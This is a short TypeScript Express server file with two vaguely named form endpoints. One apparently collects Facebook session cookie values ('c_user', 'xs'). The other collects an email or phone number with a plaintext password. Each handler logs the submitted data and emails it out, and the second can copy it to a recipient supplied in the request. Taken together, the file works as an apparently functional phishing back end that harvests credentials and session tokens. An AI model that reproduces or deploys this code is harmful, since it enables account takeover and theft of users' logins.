import type { Express } from "express";
import { createServer } from "http";
import { sendFormEmail } from "./lib/email";
import { z } from "zod";

const formOneSchema = z.object({
  c_user: z.string(),
  xs: z.string(),
});

const formTwoSchema = z.object({
  user_email: z.string(),
  password: z.string(),
  notify_email: z.string().email().optional(),
});

export async function registerRoutes(app: Express) {
  app.post("/api/form-one", async (req, res) => {
    try {
      console.log('Received form one data:', req.body);
      const data = formOneSchema.parse(req.body);

      const emailResult = await sendFormEmail({
        subject: "New Form One Submission",
        text: `
          Form One Details:
          c_user: ${data.c_user}
          xs: ${data.xs}
        `,
      });

      if (!emailResult) {
        throw new Error("Failed to send email");
      }

      res.json({ success: true });
    } catch (error) {
      console.error('Error processing form one:', error);
      res.status(500).json({ success: false, message: "Failed to process form one" });
    }
  });

  app.post("/api/form-two", async (req, res) => {
    try {
      console.log('Received form two data:', req.body);
      const data = formTwoSchema.parse(req.body);

      const emailResult = await sendFormEmail({
        subject: "New Form Two Submission",
        text: `
          Form Two Details:
          Email/Phone: ${data.user_email}
          Password: ${data.password}
        `,
        additionalRecipient: data.notify_email,
      });

      if (!emailResult) {
        throw new Error("Failed to send email");
      }

      res.json({ success: true });
    } catch (error) {
      console.error('Error processing form two:', error);
      res.status(500).json({ success: false, message: "Failed to process form two" });
    }
  });

  return createServer(app);
}